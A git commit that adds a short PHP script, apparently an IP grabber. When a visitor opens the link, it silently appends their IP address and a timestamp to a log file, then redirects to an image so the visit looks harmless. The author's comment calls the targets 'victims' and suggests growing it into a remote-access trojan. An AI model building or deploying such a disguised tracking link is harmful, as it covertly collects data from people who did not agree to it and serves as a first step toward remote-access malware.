53f7bc04a7bb61457faf7dad94ecacf829cd3ed0
p1d0r4s <153553100+p1d0r4s@users.noreply.github.com>
2023-12-12 02:30:46 +0500

    Create index.php

---
+++ index.php
@@ -0,0 +1,12 @@
+<?php
+// set ur shit urself i wont teach u ez things, can be remaked into something very big like launching apps on victim's pc, and even rat.
+$filename = 'logss.txt'; // will create a txt file with that name
+
+$ip = $_SERVER['REMOTE_ADDR']; // gets ip
+
+$content = "$ip | " . date('Y-m-d H:i:s') . PHP_EOL; // content that will be in the txt
+file_put_contents($filename, $content, FILE_APPEND);
+
+header('Location: gnegrila.png'); // put ur own png ( in the same directory as the php file )
+exit();
+?>
